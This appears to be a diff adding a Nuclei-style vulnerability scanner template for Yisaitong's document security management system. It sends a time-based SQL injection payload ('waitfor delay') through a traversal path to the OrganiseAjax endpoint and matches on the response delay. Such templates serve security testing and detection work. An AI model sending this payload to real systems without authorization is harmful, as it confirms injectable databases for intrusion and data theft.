@@ -1,0 +1,42 @@
+id: yisaitong-OrganiseAjax-sqli
+
+info:
+  name: 亿赛通电子文档安全管理系统 OrganiseAjax SQL注入漏洞
+  author: yisaitong
+  severity: high
+  tags: yisaitong
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/js/../OrganiseAjax HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        command=search&groupNameSearch=-1
+
+      - |
+        POST /CDGServer3/js/../OrganiseAjax HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        command=search&groupNameSearch=-1'waitfor delay '0:0:4'--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'duration_1 < 2'
+          - 'duration_2 >= 4'
+          - 'duration_2 <= 10'
+          - 'len(body) < 60'
+        condition: and
+      - type: word
+        part: body
+        words:
+          - 'waitfor'
